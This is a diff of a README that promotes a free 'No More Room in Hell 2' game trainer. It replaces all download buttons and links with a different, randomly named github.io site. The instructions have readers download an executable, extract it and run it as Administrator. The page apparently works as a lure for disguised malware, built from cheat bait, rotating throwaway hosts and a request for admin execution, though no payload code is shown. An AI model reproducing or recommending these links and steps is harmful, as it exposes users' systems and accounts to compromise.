@@ -2,9 +2,9 @@
 
 No More Room in Hell 2 trainer: god mode, infinite ammo — free trainer, no key.
 
-[![Download](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge)](https://yobowgileysb.github.io/WinDownload/)
-[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
-[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download](https://img.shields.io/badge/Download-Trainer-blue?style=for-the-badge)](https://mixedlinkrelease.github.io/installer/)
+[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
 ---
 
@@ -31,7 +31,7 @@ No More Room in Hell 2 stays in the top trainer searches — god mode, infinite 
 
 ### 🪟 Windows
 
-1. Download the latest build 👉 [Download Trainer](https://yobowgileysb.github.io/WinDownload/)
+1. Download the latest build 👉 [Download Trainer](https://mixedlinkrelease.github.io/installer/)
 2. Extract and run the `.exe` as Administrator.
 3. Launch No More Room in Hell 2 and load your save.
 4. Press **F1** to open the menu — toggle what you need. Done ✅
